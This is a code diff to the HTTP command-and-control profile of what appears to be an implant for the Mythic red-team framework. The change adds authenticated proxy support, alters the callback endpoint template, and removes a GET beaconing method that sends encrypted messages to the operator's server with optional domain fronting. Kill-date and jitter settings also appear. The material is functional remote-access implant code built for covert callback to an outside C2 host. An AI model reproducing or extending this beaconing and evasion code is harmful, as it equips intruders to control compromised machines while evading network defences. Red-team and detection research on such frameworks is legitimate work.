@@ -51,11 +51,17 @@ namespace Mythic.C2Profiles
         private const string sCallbackJitter = "0";
         private const string sCallbackPort = "80";
         private const string sEncryptedExchangeCheck = "T";
+        private const string sProxyHost = "";
+        private const string sProxyUser = "";
+        private const string sProxyPass = "";
 #else
         private const string sCallbackInterval = "callback_interval";
         private const string sCallbackJitter = "callback_jitter";
         private const string sCallbackPort = "callback_port";
         private const string sEncryptedExchangeCheck = "encrypted_exchange_check";
+        private const string sProxyHost = "proxy_host:proxy_port";
+        private const string sProxyUser = "proxy_user";
+        private const string sProxyPass = "proxy_pass";
 #endif
         private const string DomainFront = "domain_front";
         private const string TerminateDate = "killdate";
@@ -73,7 +79,7 @@ namespace Mythic.C2Profiles
 #if DEBUG
         private string Endpoint = "http://mythic/api/v1.4/agent_message";
 #else
-        private string Endpoint = "callback_host:callback_port/api/v1.4/agent_message";
+        private string Endpoint = "callback_host:callback_port/post_uri";
 #endif
         // Almost certainly need to pass arguments here to deal with proxy nonsense.
         /// <summary>
@@ -100,58 +106,28 @@ namespace Mythic.C2Profiles
             client.Proxy = null;
 #endif
             WebRequest.DefaultWebProxy = null;
-        }
-
-        // Make a request to the Apfell endpoint and decrypt the result
-        /// <summary>
-        /// Send a GET request to the Apfell server and decrypt the message.
-        /// </summary>
-        /// <param name="message">JSON message to send to the server.</param>
-        /// <returns>JSON string of the output.</returns>
-        private string Get(string message)
-        {
-            string result;
-#if USE_WEBCLIENT
-            egressMtx.WaitOne();
-#endif
-            while(true)
+            if (!string.IsNullOrEmpty(sProxyHost) && 
+                !string.IsNullOrEmpty(sProxyUser) &&
+                !string.IsNullOrEmpty(sProxyPass) &&
+                sProxyHost != ":")
             {
                 try
                 {
-#if USE_HTTPWEB
-                    HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create($"{Endpoint}/{base.cryptor.Encrypt(message)}");
-                    request.KeepAlive = false;
-                    request.Method = "Get";
-                    request.UserAgent = UserAgent;
-                    if (DomainFront != "" && DomainFront != "domain_front")
-                        request.Host = DomainFront;
-
-                    WebResponse response = request.GetResponse();
-                    using (StreamReader reader = new StreamReader(response.GetResponseStream()))
-                    {
-                        result = base.cryptor.Decrypt(reader.ReadToEnd());
-                    }
-#endif
-#if USE_WEBCLIENT
-                    if (!client.IsBusy)
-                    {
-                        result = base.cryptor.Decrypt(client.DownloadString($"{Endpoint}/{base.cryptor.Encrypt(message)}"));
-                        break;
-                    }
-#endif
+                    Uri host;
+                    if (sProxyHost.EndsWith(":"))
+                        host = new Uri(sProxyHost.Substring(0, sProxyHost.Length - 1));
+                    else
+                        host = new Uri(sProxyHost);
+                    ICredentials creds = new NetworkCredential(sProxyUser, sProxyPass);
+                    WebRequest.DefaultWebProxy = new WebProxy(host, true, null, creds);
                 } catch (Exception ex)
                 {
-#if USE_WEBCLIENT
-                    egressMtx.ReleaseMutex();
-#endif
-                    throw ex;
+                    WebRequest.DefaultWebProxy = null;
                 }
             }
-#if USE_WEBCLIENT
-            egressMtx.ReleaseMutex();
-#endif
-            return result;
         }
+
+        
 
         // Encrypt and post a string to the Apfell server
         /// <summary>
